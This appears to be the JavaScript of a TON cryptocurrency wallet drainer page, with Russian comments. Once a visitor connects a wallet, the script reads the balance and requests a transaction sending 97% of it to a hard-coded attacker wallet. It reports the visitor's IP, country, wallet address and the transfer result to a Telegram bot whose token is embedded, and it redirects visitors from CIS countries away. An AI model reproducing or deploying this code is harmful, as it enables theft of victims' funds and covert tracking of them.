// Конфигурация
var mainWallet = "UQCxvsxN1n1PwhIg2oUfhqXK5_dJRyvJdAkRzI9g8en-Aw-k"; // Ваш кошелек
var tgBotToken = "6632695365:AAH234LsLWIcoCL5EzKy_kGyj18skhd5xCU"; // Токен бота
var tgChatId = "-1029594875"; // ID чата (обратите внимание, что он должен быть строкой с минусом для групп/каналов)

// Получение домена
var domain = window.location.hostname;
var ipUser;
var countryUser;

// Перенаправление стран СНГ
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(data => {
    const country = data.country;
    ipUser = data.ip;
    countryUser = country;

    // Перенаправление для стран СНГ
    const countriesCIS = ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'];
    if (countriesCIS.includes(country)) {
      window.location.replace('https://ton.org');
      return; // Остановка выполнения скрипта после перенаправления
    }

    console.log('IP:', ipUser);
    console.log('Country:', countryUser);

    // Отправка информации о посещении в Telegram
    const messageOpen = `📄*Domain:* ${domain}\n💻*User:* ${ipUser} ${countryUser}\n📖*Opened the website*`;
    sendTelegramMessage(messageOpen);
  })
  .catch(error => {
    console.error('Error IP:', error);
  });

// Инициализация TON_CONNECT_UI
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
  manifestUrl: 'https://raw.githubusercontent.com/MatveyVue/manifest/refs/heads/main/tonconnect-manifest.json',
  buttonRootId: 'ton-connect'
});

// Обработчик подключения кошелька
tonConnectUI.on('walletConnected', (walletAddress) => {
  console.log('Адрес кошелька:', walletAddress);
});

// Функция отправки сообщения в Telegram
function sendTelegramMessage(text) {
  const encodedText = encodeURIComponent(text);
  const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodedText}&parse_mode=Markdown`;
  fetch(url, { method: 'POST' })
    .then(response => {
      if (response.ok) {
        console.log('Сообщение успешно отправлено');
      } else {
        console.error('Ошибка при отправке сообщения');
      }
    })
    .catch(error => {
      console.error('Ошибка сети:', error);
    });
}

// Основная функция для транзакции
async function didtrans() {
  if (!tonConnectUI.account || !tonConnectUI.account.address) {
    console.error('Кошелек не подключен');
    return;
  }

  try {
    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${tonConnectUI.account.address}`);
    const data = await response.json();

    let originalBalance = parseFloat(data.balance);
    if (isNaN(originalBalance)) {
      console.error('Некорректный баланс');
      return;
    }

    // Вычитаем комиссию 3%
    let processedBalance = originalBalance - (originalBalance * 0.03);
    
    // Переводим в токены (Giga)
    let tgBalance = processedBalance / 1_000_000_000;

    // Создаем транзакцию
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // через минуту
      messages: [{
        address: mainWallet,
        amount: Math.floor(processedBalance), // Ватт
      }]
    };

    // Отправляем транзакцию
    const result = await tonConnectUI.sendTransaction(transaction);

    // Если транзакция прошла успешно
    const messageSend = `📄*Domain:* ${domain}\n💻*User:* ${ipUser} ${countryUser}\n🔗*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n💎*Send:* ${tgBalance.toFixed(9)}`;
    
    sendTelegramMessage(messageSend);

  } catch (e) {
    console.error('Ошибка при транзакции:', e);

    // Отправляем сообщение об ошибке или отказе
    const messageDeclined = `📄*Domain:* ${domain}\n💻*User:* ${ipUser} ${countryUser}\n🔗*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n🛑*Declined or error.*`;
    
    sendTelegramMessage(messageDeclined);
  }
}
